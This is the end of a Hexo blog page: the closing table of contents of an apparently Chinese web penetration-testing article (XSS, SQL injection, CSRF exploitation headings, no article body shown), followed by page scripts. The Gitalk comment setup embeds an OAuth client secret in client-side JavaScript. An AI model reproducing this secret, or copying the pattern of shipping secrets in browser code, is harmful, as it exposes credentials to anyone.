拒绝服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13-Flash漏洞"><span class="toc-number">4.13.</span> <span class="toc-text">13. Flash漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-测试Web服务"><span class="toc-number">5.</span> <span class="toc-text">0x04 测试Web服务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-测试REST服务"><span class="toc-number">5.1.</span> <span class="toc-text">1. 测试REST服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-测试SOAP服务"><span class="toc-number">5.2.</span> <span class="toc-text">2. 测试SOAP服务</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-漏洞利用"><span class="toc-number">6.</span> <span class="toc-text">0x05 漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-利用场景"><span class="toc-number">6.1.</span> <span class="toc-text">1. 利用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-利用XSS"><span class="toc-number">6.2.</span> <span class="toc-text">2. 利用XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-浏览器劫持"><span class="toc-number">6.2.1.</span> <span class="toc-text">2.1 浏览器劫持</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-利用SQLi"><span class="toc-number">6.3.</span> <span class="toc-text">3. 利用SQLi</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-数据提取"><span class="toc-number">6.3.1.</span> <span class="toc-text">3.1 数据提取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-离线密码爆破"><span class="toc-number">6.3.2.</span> <span class="toc-text">3.2 离线密码爆破</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-认证绕过"><span class="toc-number">6.3.3.</span> <span class="toc-text">3.3 认证绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-跨站请求伪造-CSRF"><span class="toc-number">6.4.</span> <span class="toc-text">4. 跨站请求伪造(CSRF)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-结尾"><span class="toc-number">7.</span> <span class="toc-text">0x00 结尾</span></a></li></ol>
        </div>
    </div>
    
  </aside>
</main>

<script type="text/javascript">
const gitalk = new Gitalk({
  clientID: "6ae565c159db15a6167c",
  clientSecret: '6b81331560c108209346bc4807a5126da190e14c',
  repo: 'blogcomments',
  owner: 'lxzmads',
  admin: ['lxzmads'],
  id: decodeURI(location.pathname),      // Ensure uniqueness and length less than 50
  distractionFreeMode: false  // Facebook-like distraction free mode
})
gitalk.render('gitalk-container')
</script>

  <footer>
  <div class="copyright">
    <div>
      &copy; 2019 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a>&nbsp
    </div>
    <div>
      Theme by <a href="https://github.com/lewis-geek/hexo-theme-Aath" target="_blank">Aath-魔改版 by Mads</a>
    </div>
  </div>
</footer>


<script src="/lib/jquery.min.js"></script>
<script src="/lib/in-view.min.js"></script>
<script src="/lib/lodash.min.js"></script>
<script>
  var isDown = true
  var oldY = 0
  inView.offset(50)

  document.body.addEventListener('touchstart', function(){});
  
  window.addEventListener('scroll', _.throttle(e => {
    var currentY = window.scrollY
    if((oldY - currentY) < 0) {
      isDown = true
    } else {
      isDown = false
    }
    oldY = currentY
  }, 250))

  $("article img").each(function() {
      var strA = "<a data-fancybox='gallery' href='" + this.src + "'></a>";
      $(this).wrapAll(strA);
  });

  $('.toc-link').each(function() {
      var href = $(this).attr("href");
      
      inView(href).on('exit', () => {
        if (isDown) {
          handleActive(href)
        }
      })

      inView(href).on('enter', () => {
        if (!isDown) {
          handleActive(href)
        }
      })

      this.onclick = function(e) {
        var pos = $(href).offset().top - 10;
        $("html,body").animate({scrollTop: pos}, 300);
        setTimeout(() => {
          handleActive(href)
        }, 350)
        return false
      }
  })

  function handleActive(href) {
    document.querySelectorAll('.toc-link').forEach(elm => {
      elm.classList.remove('active')
    })
    document.querySelector(".toc [href='"+ href +"']").classList.add('active')
  }
</script>
<script src="/lib/jquery.fancybox.min.js"></script>


</body>
</html>
